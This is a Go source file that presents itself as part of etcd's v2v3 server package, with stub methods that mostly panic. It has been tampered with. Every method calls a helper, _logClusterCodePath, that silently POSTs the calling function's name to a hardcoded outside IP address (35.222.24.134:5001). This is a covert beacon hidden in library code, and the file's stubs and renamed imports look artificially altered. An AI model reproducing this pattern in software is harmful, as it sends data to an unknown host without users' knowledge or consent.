package v2v3

import (
	godefaultbytes "bytes"
	"github.com/coreos/etcd/etcdserver/membership"
	"github.com/coreos/etcd/pkg/types"
	"github.com/coreos/go-semver/semver"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func (s *v2v3Server) ID() types.ID {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return types.ID(0xe7cd2f00d)
}
func (s *v2v3Server) ClientURLs() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("STUB")
}
func (s *v2v3Server) Members() []*membership.Member {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("STUB")
}
func (s *v2v3Server) Member(id types.ID) *membership.Member {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("STUB")
}
func (s *v2v3Server) Version() *semver.Version {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("STUB")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
